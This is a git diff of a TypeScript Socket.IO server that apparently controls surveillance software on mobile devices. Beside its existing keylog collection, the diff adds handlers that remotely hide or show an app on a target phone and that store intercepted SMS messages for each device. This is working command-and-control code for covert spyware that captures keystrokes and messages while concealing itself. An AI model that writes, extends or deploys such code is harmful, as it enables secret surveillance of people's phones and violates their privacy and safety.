@@ -24,6 +24,8 @@ import {
 
 import { addNewKeyLogs } from "../../controllers/keylogs.controller";
 
+import { addNewMessage } from "../../controllers/sms.controller";
+
 const app = express();
 
 const server = http.createServer(app);
@@ -519,7 +521,7 @@ export const startSocketIO = async () => {
 					}
 				}
 			);
-
+			// Online Key logs
 			socket.on(
 				`${SocketIOPublicEvents.KEY_MOBILE_RESPONSE}`,
 				async (response: any) => {
@@ -548,9 +550,6 @@ export const startSocketIO = async () => {
 									created_at: Date.now(),
 								}
 							);
-
-							// Data should be include deviceId and keylogs
-							// await addNewKeyLogs(response);
 						} else {
 							console.log("Empty key logs, skipping...");
 						}
@@ -675,12 +674,6 @@ export const startSocketIO = async () => {
 				async (data: any) => {
 					try {
 						const { deviceId, type, app } = data;
-						console.log(
-							"Application Event Requesting:",
-							deviceId,
-							type,
-							app
-						);
 
 						io.emit(
 							`${SocketIOMobileEvents.MOBILE_APP_EVENT_MONITOR}-${deviceId}`,
@@ -1119,6 +1112,65 @@ export const startSocketIO = async () => {
 						);
 					} catch (error) {
 						console.log("Uninstall App Response Error", error);
+					}
+				}
+			);
+
+			// Hide/Show APP
+			socket.on(
+				`${SocketIOPublicEvents.DISPLAY_APP_EVENT}`,
+				async (data: any) => {
+					try {
+						const { deviceId, type } = data;
+						console.log("hide/show app:", data);
+						io.emit(
+							`${SocketIOMobileEvents.MOBILE_DISPLAY_APP_EVENT}-${deviceId}`,
+							{
+								deviceId,
+								type,
+							}
+						);
+					} catch (error) {
+						console.log("hide/show APP Error", error);
+					}
+				}
+			);
+
+			// Recieve hide/show app result from mobile
+			socket.on(
+				`${SocketIOPublicEvents.DISPLAY_APP_RESPONSE}`,
+				async (response: any) => {
+					try {
+						const deviceId = response.deviceId;
+						const type = response.type;
+
+						io.emit(
+							`${SocketIOPublicEvents.DISPLAY_APP_SHARED}-${deviceId}`,
+							{
+								deviceId,
+								type,
+							}
+						);
+					} catch (error) {
+						console.log("Hide/Show App Response Error", error);
+					}
+				}
+			);
+
+			// Online Message logs
+			socket.on(
+				`${SocketIOPublicEvents.SMS_MANAGER_RESPONSE}`,
+				async (response: any) => {
+					try {
+						const deviceId = response.deviceId;
+						const message = response.message;
+						if (deviceId && message != "") {
+							addNewMessage(response);
+						} else {
+							console.log("Empty messages, skipping...");
+						}
+					} catch (error) {
+						console.error("Message Response Error", error);
 					}
 				}
 			);
